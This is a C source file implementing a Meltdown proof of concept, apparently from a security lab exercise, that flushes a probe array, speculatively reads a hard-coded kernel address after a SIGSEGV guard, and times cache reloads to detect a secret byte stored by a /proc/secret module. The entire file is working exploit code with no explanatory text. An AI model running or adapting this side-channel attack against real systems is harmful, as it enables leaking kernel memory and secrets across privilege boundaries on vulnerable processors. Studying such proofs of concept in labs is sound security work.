#define _POSIX_SOURCE
#define _XOPEN_SOURCE 500
#include <stdio.h>
#include <signal.h>
#include <stdlib.h>
#include <string.h>
#include <setjmp.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdint.h>
#include <emmintrin.h>
#include <x86intrin.h>
#include "cacheutils.h"

#define CACHE_HIT_THRESHOLD 120
#define MARGIN 1024

int array[256*4096];
static jmp_buf restore_point;
unsigned long count;

void handle_segfault(int sig)
{
  signal(SIGSEGV, &handle_segfault);
  longjmp(restore_point, SIGSEGV);

}

void handle_segint(int sig)
{
  printf("Caught interrupt signal %d\n", sig);
  exit(1);
}

void doflush()
{
  int i;

  // FLush the array elements that could be cached
  for (i=0; i<256; i++)
  _mm_clflush(&array[i*4096]);
}

void reload()
{
  int i;
  uint64_t start, end;
  // Reload the array and check hits
  register uint64_t time1, time2;
  int *addr;

  for (i=0; i<256; i++)
  {
  addr = &array[i*4096];
   start = rdtsc();
   *addr = 1;
   end = rdtsc();
   if ((end - start) <= CACHE_HIT_THRESHOLD)
    {
	if (i == 'N')    //  secret value
 		count++;
      }
  }
}

void meltdown(unsigned long kernel_addr)
{
  char data = 0;
  int i, a=0;

asm volatile(

       ".rept 400;"                

       "add $0x1, %%ebx;"

       ".endr;"                    

    

       :

       :

       : "ebx"

   ); 
 
  data = *(char*)kernel_addr;  
  array[data * 4096] += 1; 
}

int main()
{
  int i, j, ret=0;      // change ret var name later

  // Registering Signal handler for SIGSEGV
  signal(SIGSEGV, handle_segfault);
  int fd = open("/proc/secret", O_RDONLY);

  if (fd < 0) {
    perror("open");
    return -1;
  }
  doflush();
  // Retry 1000 times on the same address.

  int fault_code;
 count = 0; 
 for (i = 0; i < 1000; i++) {
    ret = pread(fd, NULL, 0, 0); 
    if (ret < 0) {
      perror("pread");
      break;
    }
  
  // Flush the probing array
  for (j = 0; j < 256; j++) 
    _mm_clflush(&array[j * 4096]);
  
  fault_code = sigsetjmp(restore_point, 1);
  if (fault_code == 0) 
  {
    meltdown(0xffffffffc04e8000); 
  }
  else{
    reload();
  }
  }
  
  printf("Secret appeared %ld times \n", count);
return 0;
}

